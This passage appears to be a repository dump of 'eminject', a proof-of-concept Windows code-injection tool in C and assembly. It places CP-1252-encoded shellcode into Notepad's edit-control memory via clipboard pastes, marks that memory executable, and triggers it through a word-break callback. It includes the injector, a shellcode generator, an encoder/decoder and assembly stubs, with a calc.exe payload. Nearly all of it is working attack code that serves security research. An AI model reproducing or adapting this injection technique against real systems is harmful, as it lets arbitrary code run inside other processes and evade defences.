  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

BOOL em_inject(void) {
    HWND   npw, ecw;
    w64_t  emh, lastbuf, embuf;
    SIZE_T rd;
    HANDLE hp;
    DWORD  cslen, pid, old;
    BOOL   r;
    PBYTE  cs;
    
    char   buf[1024];
    
    // get window handle for notepad class
    npw = FindWindow("Notepad", NULL);
    if(npw == NULL) {
      printf("  [-] Unable to find Notepad. Is it running?\n");
      return FALSE;
    }
    
    // get window handle for edit control
    ecw = FindWindowEx(npw, NULL, "Edit", NULL);
    if(ecw == NULL) {
      printf("  [-] Unable to find Edit Control for Notepad.\n");
      return FALSE;
    }
    
    // get the EM handle for the edit control
    emh.p = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    if(emh.p == NULL) {
      printf("  [-] Unable to read EM handle for %p\n", ecw);
      return FALSE;
    }
    
    // get the process id for the window and open the process
    if(GetWindowThreadProcessId(ecw, &pid) == 0) {
      printf("  [-] Unable to read process id for %p\n", ecw);
      return FALSE;
    }
    
    // copy some test data to the clipboard
    memset(buf, 0x4d, sizeof(buf));

    if(!CopyToClipboard(CF_TEXT, buf, sizeof(buf))) {
      printf("  [-] CopyToClipboard failed.\n");
      return FALSE;
    }
    
    // open the process for reading and changing memory permissions
    hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if(hp == NULL) {
      printf("  [-] Unable to open process for %p\n", ecw);
      return FALSE;
    }
    
    // loop until target buffer address is stable and meets our criteria
    // just spam the buufer until last 8-Bits are less than < calc3
    lastbuf.p = NULL;
    r = FALSE;
    
    for(;;) {
      printf("  [+] Reading address of buffer : ");       
      if(!ReadProcessMemory(hp, emh.p, 
        &embuf.p, sizeof(ULONG_PTR), &rd)) {
        printf("FAILED!\n");
        break;
      }
      
      printf("%p\n", embuf.p);
      
      // Address hasn't changed? exit loop
      if(embuf.p == lastbuf.p) {
        r = TRUE;
        printf("  [+] Buffer appears to be ready.\n");
        break;
      }
      // save this address
      lastbuf.p = embuf.p;
    
      // clear the contents of edit control
      SendMessage(ecw, EM_SETSEL, 0, -1);
      SendMessage(ecw, WM_CLEAR, 0, 0);
      
      // send the WM_PASTE message to the edit control
      // allow notepad some time to read the data from clipboard
      printf("  [+] Sending WM_PASTE to %p\n", (PVOID)ecw);
      SendMessage(ecw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
    }

    if(r) {
      printf("  [+] Setting %p to RWX...", embuf.p);
      if(VirtualProtectEx(hp, embuf.p, 
        4096, PAGE_EXECUTE_READWRITE, &old))
      {
        printf("OK.\n");
        
        printf("  [+] Generating shellcode for %p\n", embuf.p);
        cs = cp1252_generate_winexec(pid, &cslen);
        
        printf("  [+] Injecting %i bytes of shellcode with WM_PASTE.\n", cslen);
        CopyToClipboard(CF_TEXT, cs, cslen);
        
        printf("  [+] Clearing buffer.\n");
        SendMessage(ecw, EM_SETSEL, 0, -1);
        SendMessage(ecw, WM_CLEAR, 0, 0);
        
        SendMessage(ecw, WM_PASTE, 0, 0);
        Sleep(WAIT_TIME);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to shellcode at %p\n", embuf.p);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
   
        if(GetSystemMetrics(SM_SWAPBUTTON)) {
          printf("  [+] Mouse buttons are swapped.\n");
        }
        
        printf("  [+] Executing shellcode with WM_LBUTTONDBLCLK.\n");
        SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
        
        printf("  [+] Setting EM_SETWORDBREAKPROC to %p\n", NULL);
        SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
        
        printf("  [+] Setting %p to RW...", embuf.p);
        r = VirtualProtectEx(hp, embuf.p,
          4096, PAGE_READWRITE, &old);
          
        printf("%s\n", r ? "OK" : "FAILED");
      } else {
        printf("VirtualProtectEx error %i.\n", GetLastError());
      }
    }
    CloseHandle(hp);
    return r;
}

int main(int argc, char *argv[]) {
    if(!em_inject()) {
      printf("  [+] Running notepad...\n");
      WinExec("notepad", SW_SHOW);
      em_inject();
    }
    return 0;
}

```

`eminject/test_code/calc.asm`:

```asm
    
    ;
    ; CP-1252 compatible code stub for executing calc.exe
    ; odzhan, july 2020
    ;
    bits 32
    
    dec dword[eax]
    
    ; 1. Initialize rbp
    mov    al, 0
    enter  256, 0
    
    ; 2. Store rbp
    push   ebp
    add    [ebp], al
    
    ; 3. Create local variable for rbp
    push   0
    push   esp
    add    [ebp], al
    pop    ebp
    add    [ebp], cl
    
    ; 4. Store lpch pointer
    push   ecx
    add    [ebp], cl
    
    ; 5. Load lpch pointer into rsi
    pop    esi
    add    [ebp], cl
    
    ; 6. Load address of where to store decoder
    lodsd
    add    [ebp], cl
    
    ; 7. Store address on stack 
    push   eax
    add    [ebp], cl
    
    ; 8. Store address on stack
    push   eax
    add    [ebp], cl
    
    ; 9. Load address into rdi
    pop    edi
    add    [ebp], cl
    
    ; 10. Read and store byte
    movsb
    add    [ebp], cl
    
    ; 11. Skip byte
    lodsb
    add    [ebp], cl
    
    ; ****************************************
    ; repeat steps 10-11 until bytes processed
    ; ****************************************
    
    ; execute decoder
    ret
    
    ; step 1.
    ; subtract 8 from RSP to align
    ; initialize RBP for writing
    push   0
    enter  256, 0
    
    ; step 2.
    ; write \x63 \x61 \x6c \x63 \x00 or "calc\0" to local buffer

    push   0
    push   esp
    add    [ebp], cl  
    pop    edi
    add    [ebp], cl
    push   edi
    add    [ebp], cl
    pop    ecx
    add    [ebp], cl
    
    ; store 'c'
    mov    eax, 0xFF006300
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'a'
    mov    eax, 0xFF006100
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'l'
    mov    eax, 0xFF006c00
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'c'
    mov    eax, 0xFF006300
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl
    
    ; store '\0'
    stosb
    add    [ebp], cl
    
    ; step 3.
    ; set rdx = SW_SHOW (5)
    push   0
    push   esp
    add    [ebp], cl
    pop    eax
    add    [ebp], cl
    mov    byte[eax], 5
    add    [ebp], cl
    pop    edx
    add    [ebp], cl
    
    ; the rest of code is added by cp1252_generate()
    
    ; step 4.
    ; store address of ntdll!RtlExitUserThread on stack
    
    ; step 5.
    ; store address of kernel32!WinExec
    
    ; step 6.
    ; invoke WinExec("calc", SW_SHOW), then RtlExitUserThread(rcx)
    
    
    
```

`eminject/test_code/cp1252_encoder.c`:

```c
//
// A simple PoC for the blog post.
// 
// odzhan

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#define CP1252_KEY 0x4d

typedef uint8_t u8;
typedef uint32_t u32;

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// determines if byte is compatible with CP1252 encoding
// and the CP1252 decoder using escape codes
static
int is_decoder_allowed(u8 ch) {
    // check for null byte and escape code
    if(ch == 0 || ch == 1) return 0;
    
    return is_cp1252_allowed(ch);
}

// encode raw data to CP-1252 compatible data
static
void cp1252_encode(FILE *in, FILE *out) {
    uint8_t c, t;
    
    for(;;) {
      // read byte
      c = getc(in);
      // end of file? exit
      if(feof(in)) break;
      // if the result of c + 1 is disallowed
      if(!is_decoder_allowed(c + 1)) {
        // write escape code
        putc(0x01, out);
        // save byte XOR'd with the 8-Bit key
        putc(c ^ CP1252_KEY, out);
      } else {
        // save byte plus 1
        putc(c + 1, out);
      }
    }
}

// decode data processed with cp1252_encode to their original values
static
void cp1252_decode(FILE *in, FILE *out) {
    uint8_t c, t;
    
    for(;;) {
      // read byte
      c = getc(in);
      // end of file? exit
      if(feof(in)) break;
      // if this is an escape code
      if(c == 0x01) {
        // read next byte
        c = getc(in);
        // XOR the 8-Bit key
        putc(c ^ CP1252_KEY, out);
      } else {
        // save byte minus one
        putc(c - 1, out);
      }
    }
}

// User interface.  Args are input and output file.
int main(int argc, char **argv) {
    struct stat fs;
    FILE *in, *out;
    
    // Check arguments
    if ((argc!=4)||((argv[1][0]!='e')&&(argv[1][0]!='d'))) {
        printf("Usage: cp1252 e/d infile outfile\n");
        return 0;
    }
    if(stat(argv[2], &fs) != 0) {perror(argv[2]); return -1;}
    if(fs.st_size == 0) {printf("%s is empty.\n", argv[2]); return -1;}
    
    in = fopen(argv[2], "rb");
    if (!in) {perror(argv[2]); return -1;}
    
    out = fopen(argv[3], "wb");
    if (!out) {perror(argv[3]); return -1;}
    
    if (argv[1][0]=='e') {
        printf("Encoding %s to %s ...\n", argv[2], argv[3]);
        cp1252_encode(in, out);
    } else {
        printf("Decoding %s from %s ...\n", argv[3], argv[2]);
        cp1252_decode(in, out);
    }
    fclose(in);
    fclose(out);
    return 0;
}

```

`eminject/test_code/cp1252_x86.asm`:

```asm

; cp1252 decoder in 40 bytes of x86/amd64 assembly
; presumes to be executing in RWX memory
; needs stack allocation if executing from RX memory
;
; odzhan

    bits 32
    
    %define CP1252_KEY 0x4D
    
    jmp    init_decode       ; read the program counter
    
    ; esi = source
    ; edi = destination 
    ; ecx = length
decode_bytes:
    lodsb                    ; read a byte
    dec    al                ; c - 1
    jnz    save_byte
    lodsb                    ; skip null byte
    lodsb                    ; read next byte
    xor    al, CP1252_KEY    ; c ^= CP1252_KEY
save_byte:
    stosb                    ; save in buffer
    lodsb                    ; skip null byte
    loop   decode_bytes
    ret
load_data:
    pop    esi               ; esi = start of data
    ; ********************** ; decode the 32-bit length
read_len:
    push   0                 ; len = 0
    push   esp               ; 
    pop    edi               ; edi = &len
    push   4                 ; 32-bits
    pop    ecx
    call   decode_bytes
    pop    ecx               ; ecx = len
    
    ; ********************** ; decode remainder of data
    push   esi               ; 
    pop    edi               ; edi = encoded data
    push   esi               ; save address for RET
    jmp    decode_bytes
init_decode:
    call   load_data
    ; CP1252 encoded data goes here..
    
```

`eminject/test_code/demo.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

// default is 1 second
#define WAIT_TIME 1000

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);

// the max address for virtual memory on 
// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
#define MAX_ADDR 6

// Allocate 64-bit buffer on the stack.
// Then place the address in RDI for writing.
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x5d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
};

// Transfers control of execution to kernel32!WinExec
#define RET_SIZE 2

char RET[] = {
  /* 0000 */ "\xc3" /* ret  */
  /* 0002 */ "\x00"
};

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
  
    // zero is allowed, but we can't use it
    if(ch == 0) return 0;
    
    // bytes converted to double byte characters
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

/**
static
u8* cp1252_generate_winexec2(int *cslen) {
    int     i, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = malloc(512);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC, CALC_SIZE);
    out += CALC_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store ntdll!RtlExitUserThread on stack
    m = GetModuleHandle("ntdll");
    addr.p = GetProcAddress(m, "RtlExitUserProcess");
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    addr.p = GetProcAddress(m, "WinExec");
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // add RET opcode
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    // calculate length of constructed code
    outlen = (int)(out - (u8*)cs);
    
    // convert to ascii
    for(i=0; i<outlen; i+=2) {
      if(cs[i] == 0) {
        printf("WARNING! Detected null byte at offset %x\n", i);
      }
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // return pointer to code
    return cs;
}*/


#define RET_OFS2 0x18 + 2

#include "calc4.h"

#define RET_OFS 0x20 + 2

#include "calc3.h"

LPVOID GetRemoteModuleHandle(DWORD pid, LPCSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

static
u8* cp1252_generate_winexec(int pid, int *cslen) {
    int     i, ofs, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = VirtualAlloc(
      NULL, 4096, 
      MEM_COMMIT | MEM_RESERVE, 
      PAGE_EXECUTE_READWRITE);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC3, CALC3_SIZE);
    out += CALC3_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    printf("  [+] Local Base address for kernel32 : %p\n", (PVOID)m);
    addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
    m = GetRemoteModuleHandle(pid, "kernel32.dll");
    printf("  [+] Remote Base address for kernel32 : %p\n", (PVOID)m);
    addr.q += (ULONG_PTR)m;
    
    printf("WinExec : %p\n", addr.p);

    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // calculate length of constructed code
    ofs = (int)(out - (u8*)cs) + 2;
    
    // first offset
    printf("Offset is %x\n", ofs);
    cs[RET_OFS] = (uint8_t)ofs;
    
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    memcpy(out, CALC4, CALC4_SIZE);
    
    // second offset
    ofs = CALC4_SIZE;
    printf("2nd offset is %x\n", ofs);
    ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
    out += CALC4_SIZE;
    
    outlen = ((int)(out - (u8*)cs) + 1) & -2;

    //DebugBreak();
   // ((void(*)())cs)(cs);
    
    printf("Returned OK.\nSaving code to file.\n");
    FILE *fd = fopen("unicode.bin", "wb");
    fwrite(cs, 1, outlen, fd);
    fclose(fd);
    
    // convert to ascii
    for(i=0; i<=outlen; i+=2) {
      if(cs[i] == 0) {
        printf("WARNING! Detected null byte at offset %x\n", i);
      }
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // return pointer to code
    return cs;
}

BOOL CopyToClipboard(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("  [-] Unable to open clipboard.\n");
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("  [-] Unable to empty clipboard.\n");
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(
      GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
      
    if(gmem == NULL) {
      printf("  [-] Unable to allocate memory.\n");
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("  [-] GlobalLock failed.\n");
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
    GlobalFree(gmem);
exit_copy:
    CloseClipboard();
    return bResult;
}

BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
    char cls[MAX_PATH];
    HWND hw=NULL, *out = (HWND*)lParam;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // Rich edit controls do not store text as a simple array of characters.
    if(!lstrcmp(cls, "Notepad")) {
      hw = FindWindowEx(hwnd, NULL, "Edit", NULL);
      if(hw != NULL) {
        *out = hw;
        return FALSE;
      }
    }
    return TRUE;
}

void calc(void);

int main(void) {
    int                  cslen;
    PBYTE                cs;
    PVOID                emh, ptr;
    DWORD                old;
    SIZE_T               rd;
    HWND                 hw=NULL;
    CLIENT_ID            cid;
    HANDLE               ht;
    w64_t                embuf, lastbuf;
    HMODULE              m;
    STARTUPINFO          si;
    PROCESS_INFORMATION  pi;
    FILE                 *fd;
    
    printf("\n  [+] Executing notepad.\n");
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    
    CreateProcess(NULL, "notepad", NULL, 
      NULL, TRUE, 0, NULL, NULL, &si, &pi);
    // wait some time for process to fully initialize
    Sleep(WAIT_TIME);
    
    printf("  [+] Obtaining handle for edit control.\n");
    EnumThreadWindows(pi.dwThreadId, EnumThreadWnd, (LPARAM)&hw);
    
    if(hw == NULL) {
      printf("  [-] Unable to obtain the window handle.\n");
      goto cleanup;
    }

    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0); 
    if(emh == NULL) {
      printf("  [-] Edit Control has no EM handle!\n");
      goto cleanup;
    }
    
    printf("  [+] Generating CP-1252 shellcode.\n");
    cs = cp1252_generate_winexec(pi.dwProcessId, &cslen);
    
    // save to file for inspection
    fd = fopen("ascii.bin", "wb");
    fwrite(cs, 1, cslen, fd);
    fclose(fd);
    
    // copy code to the clipboard
    if(!CopyToClipboard(CF_TEXT, cs, cslen)) {
      printf("  [-] Error copying shellcode to clipboard.\n");
      return 0;
    }
    printf("  [+] Shellcode copied to clipboard.\n");
    
    // loop until buffer size is stable
    lastbuf.p = NULL;
    
    for(;;) {
      printf("  [+] Reading address of buffer : ");       
      ReadProcessMemory(pi.hProcess, emh, 
        &embuf.p, sizeof(ULONG_PTR), &rd);
      
      printf("%p\n", embuf.p);
      
      // Address hasn't changed? exit loop
      if(embuf.p == lastbuf.p) {
        printf("  [+] Buffer appears to be ready.\n");
        break;
      }
      // save this address
      lastbuf.p = embuf.p;
    
      // clear the contents of edit control
      SendMessage(hw, EM_SETSEL, 0, -1);
      SendMessage(hw, WM_CLEAR, 0, 0);
      
      // send the WM_PASTE message to the edit control
      // allow notepad some time to read the data from clipboard
      printf("  [+] Sending WM_PASTE to %p\n", (PVOID)hw);
      SendMessage(hw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
    }
    
    printf("  [+] Setting %p to RWX.\n", embuf.p);
    VirtualProtectEx(pi.hProcess, embuf.p, 
      4096, PAGE_EXECUTE_READWRITE, &old);
    
    // set procedure to execute
    printf("  [+] Setting word break procedure to %p\n", embuf.p);
    
    
    printf("  [+] Attempting to execute code...\n");
    
    // clear the contents of buffer and execute via word wrap
    //SendMessage(hw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
   
    //getchar();
    SendMessage(hw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);

    // clear the contents of edit control
    //SendMessage(hw, EM_SETSEL, 0, -1);
    //SendMessage(hw, WM_CLEAR, 0, 0);
   // SendMessage(hw, WM_PASTE, 0, 0);
      
    //getchar();
    
    SendMessage(hw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
   // Sleep(WAIT_TIME);
    SendMessage(hw, EM_SETWORDBREAKPROC, 0, 0);
      ReadProcessMemory(pi.hProcess, emh, 
        &embuf.p, sizeof(ULONG_PTR), &rd);
      
      printf("%p\n", embuf.p);
      
    getchar();
    
    // set the memory buffer for the edit control to RW
    VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
    
    free(cs);
cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

```

`eminject/test_code/eminject.c`:

```c
/**
  Copyright © 2019-2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <inttypes.h>

#include <windows.h>
#include <tlhelp32.h>
#pragma comment(lib, "user32.lib")

// default is 1 second
#define WAIT_TIME 1000

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);
    
// Initialize RBP for writing
#define EM_INIT_SIZE 4

char EM_INIT[] = {
  /* 0000 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
};

// Allocate 64-bit buffer on stack and place address in RDI for writing
#define STORE_ADR_INIT_SIZE 10

char STORE_ADR_INIT[] = {
